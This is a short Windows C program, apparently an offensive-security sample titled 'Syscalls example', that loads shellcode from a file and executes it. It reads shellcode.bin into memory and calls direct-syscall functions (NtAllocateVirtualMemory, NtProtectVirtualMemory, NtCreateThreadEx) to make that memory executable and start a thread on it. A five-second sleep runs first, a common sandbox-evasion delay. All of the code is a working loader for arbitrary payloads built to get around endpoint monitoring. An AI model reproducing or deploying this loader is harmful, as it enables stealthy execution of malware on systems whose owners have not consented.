#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include "syscalls_all.h"

#define WIN32_LEAN_AND_MEAN
#define WAIT_TIME 5000

void runShellcode() {
	HANDLE shellcodeFileHandle;
	SIZE_T shellcodeLength;
	BYTE* shellcode;
	DWORD bytesRead;
	HANDLE currentProcHandle;
	BYTE* shellcodeMemPtr;
	DWORD oldProtection;
	HANDLE threadHandle;

	// Open the "shellcode.bin" file.
	shellcodeFileHandle = CreateFile(
		"shellcode.bin", 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
	);

	// Get the file size.
	if (shellcodeFileHandle == INVALID_HANDLE_VALUE || 
		GetFileSizeEx(shellcodeFileHandle, (PLARGE_INTEGER)&shellcodeLength) == INVALID_FILE_SIZE) {
			puts("Failed to read shellcode from file.");
			ExitProcess(-1);
	}

	// Allocate space to read the file into.
	shellcode = (BYTE*)VirtualAlloc(
		0, 
		shellcodeLength * sizeof(BYTE),
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE
	);
	
	// Read the file into 'shellcode'.
	if (ReadFile(shellcodeFileHandle, shellcode, shellcodeLength, &bytesRead, NULL) == FALSE) {
		CloseHandle(shellcodeFileHandle);
		ExitProcess(-1);
	}

	// Check we've read it in correctly.
	if (bytesRead != shellcodeLength) {
		puts("Failed to read all shellcode from file.");
		ExitProcess(-1);
	}
	
	if (CloseHandle(shellcodeFileHandle) == 0) {
		puts("Failed to close file handle.");
		ExitProcess(-1);
	}

	// Get a handle to the current process.
	currentProcHandle = GetCurrentProcess();

	// Allocate a new memory region for the shellcode,
	// this time using NtAllocateVirtualMemory.
	NtAllocateVirtualMemory(
		currentProcHandle, 
		(PVOID*)(&(shellcodeMemPtr)),
		0, 
		&shellcodeLength, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE
	);

	// Copy shellcode that was read in from the file
	// over to the new memory region.
	for (SIZE_T i = 0; i < shellcodeLength; i++) {
		shellcodeMemPtr[i] = shellcode[i];
	}

    // Make the new region readable and executable
    // using NtProtectVirtualMemory.
	NtProtectVirtualMemory(
		currentProcHandle, 
		(PVOID*)(&(shellcodeMemPtr)), 
		&shellcodeLength, 
		PAGE_EXECUTE_READ, 
		&oldProtection
	);
	
	// Create a new thread with NtCreateThreadEx.
	NtCreateThreadEx(
		&threadHandle, 
		THREAD_ALL_ACCESS, 
		NULL, 
		currentProcHandle, 
		shellcodeMemPtr, 
		NULL, 
		FALSE, 
		0, 0, 0, 
		NULL
	);

	// Waits until the specified object attains a signaled state.
	NtWaitForSingleObject(threadHandle, FALSE, NULL);
}

int main(int argc, const char** argv) {
	puts("Syscalls example.");
	printf("Sleeping for %d seconds.\n", WAIT_TIME/ 1000);
	Sleep(WAIT_TIME);
	runShellcode();
	return 0;
}